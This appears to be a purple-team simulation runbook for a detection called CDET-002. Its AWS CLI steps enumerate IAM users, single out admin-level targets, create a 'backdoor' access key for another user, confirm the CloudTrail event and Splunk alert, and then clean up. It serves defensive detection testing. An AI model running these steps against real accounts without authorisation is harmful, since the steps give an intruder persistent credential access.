# CDET-002 — Simulation Steps: IAM Access Key Created for Existing User

## Prerequisites

### Required AWS Permissions
- `iam:ListUsers` — to enumerate target users
- `iam:ListAccessKeys` — to check existing key count
- `iam:ListAttachedUserPolicies` — to identify high-privilege targets
- `iam:CreateAccessKey` — to create the backdoor key
- `iam:DeleteAccessKey` — for cleanup

### Pre-flight Check
```bash
# Verify current identity
aws sts get-caller-identity

# Check permissions
aws iam simulate-principal-policy \
  --policy-source-arn $(aws sts get-caller-identity --query Arn --output text) \
  --action-names iam:CreateAccessKey iam:ListUsers iam:ListAccessKeys \
  --query 'EvaluationResults[].{Action:EvalActionName,Decision:EvalDecision}' \
  --output table
```

---

## Step 1: Identify Target Users

```bash
# List all IAM users with creation date and last activity
aws iam list-users \
  --query 'Users[].{Username:UserName, Created:CreateDate, UserId:UserId}' \
  --output table

# Expected output:
# -----------------------------------------------------------
# |                       ListUsers                         |
# +-----------+---------------------------+-----------------+
# | Username  | Created                   | UserId          |
# +-----------+---------------------------+-----------------+
# |  alice    | 2024-01-15T10:22:00+00:00 | AIDAXXXXXXXXXXXX|
# |  svc-cicd | 2023-06-01T08:00:00+00:00 | AIDAYYYYYYYYYYYY|
# +-----------+---------------------------+-----------------+

# Find users with admin-level policies (high-value targets)
for user in $(aws iam list-users --query 'Users[].UserName' --output text); do
  policies=$(aws iam list-attached-user-policies --user-name "$user" \
    --query 'AttachedPolicies[?contains(PolicyName, `Admin`) || contains(PolicyName, `FullAccess`)].PolicyName' \
    --output text)
  if [ -n "$policies" ]; then
    echo "HIGH VALUE TARGET: $user — Policies: $policies"
  fi
done
```

---

## Step 2: Check Current Key Count for Target User

Each IAM user can have at most **2 access keys**. If the target already has 2 active keys, you must delete one before creating a new one (which itself would generate a detectable `DeleteAccessKey` event).

```bash
export TARGET_USER="alice"  # Replace with your target username

# Check existing key count and status
aws iam list-access-keys \
  --user-name "$TARGET_USER" \
  --query 'AccessKeyMetadata[].{KeyId:AccessKeyId, Status:Status, Created:CreateDate}' \
  --output table

# Expected output if user has 1 key:
# -----------------------------------------------------------------
# |                      ListAccessKeys                           |
# +-----------------------+----------+--------------------------+ |
# | KeyId                 | Status   | Created                  | |
# +-----------------------+----------+--------------------------+ |
# | AKIAIOSFODNN7EXAMPLE  | Active   | 2024-01-15T10:22:00+00:00||
# +-----------------------+----------+--------------------------+ |

# If user has 0 or 1 keys, you can proceed to create a new one.
# If user has 2 keys, you must delete one (noisy — skip in simulation or pick a different target).
```

---

## Step 3: Create the Backdoor Access Key

```bash
# WARNING: This creates a real access key — the SecretAccessKey is only shown once.
# In a real attack, the adversary would immediately exfiltrate this value.

aws iam create-access-key \
  --user-name "$TARGET_USER"

# Expected output:
# {
#     "AccessKey": {
#         "UserName": "alice",
#         "AccessKeyId": "AKIANEWKEYXXXXXXXX",
#         "Status": "Active",
#         "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
#         "CreateDate": "2026-06-16T00:00:00+00:00"
#     }
# }
# NOTE: The SecretAccessKey is ONLY shown here — it is never retrievable again via API.
# NOTE: The SecretAccessKey is NOT logged in CloudTrail — only the AccessKeyId is recorded.
```

**CloudTrail event generated**: `CreateAccessKey`

---

## Step 4: Verify Key Is Active

```bash
# Confirm the new key appears in the user's key list
aws iam list-access-keys \
  --user-name "$TARGET_USER" \
  --query 'AccessKeyMetadata[].{KeyId:AccessKeyId, Status:Status, Created:CreateDate}' \
  --output table

# Verify key works (requires the SecretAccessKey from step 3)
# In a real attack, this would be run from an external machine:
# AWS_ACCESS_KEY_ID=AKIANEWKEYXXXXXXXX \
# AWS_SECRET_ACCESS_KEY=<secret> \
# aws sts get-caller-identity
```

---

## Step 5: Verify Detection Trigger

```bash
# Query CloudTrail for the CreateAccessKey event
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateAccessKey \
  --start-time $(date -u -d '30 minutes ago' +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || date -u -v-30M +%Y-%m-%dT%H:%M:%SZ) \
  --query 'Events[].{Time:EventTime,User:Username,Event:EventName,Resources:Resources}' \
  --output table
```

The CDET-002 detection should alert in Splunk if:
- The creator identity (`userIdentity.arn`) differs from `requestParameters.userName`, OR
- The target user has privileged policies attached

---

## Step 6: Cleanup

```bash
# List the new key to get its ID
NEW_KEY_ID=$(aws iam list-access-keys --user-name "$TARGET_USER" \
  --query 'AccessKeyMetadata | sort_by(@, &CreateDate) | [-1].AccessKeyId' \
  --output text)

echo "Deleting backdoor key: $NEW_KEY_ID for user: $TARGET_USER"

# WARNING: This deletes an access key permanently
aws iam delete-access-key \
  --user-name "$TARGET_USER" \
  --access-key-id "$NEW_KEY_ID"

echo "Cleanup complete: Access key $NEW_KEY_ID deleted from $TARGET_USER"
```

**CloudTrail event generated by cleanup**: `DeleteAccessKey`
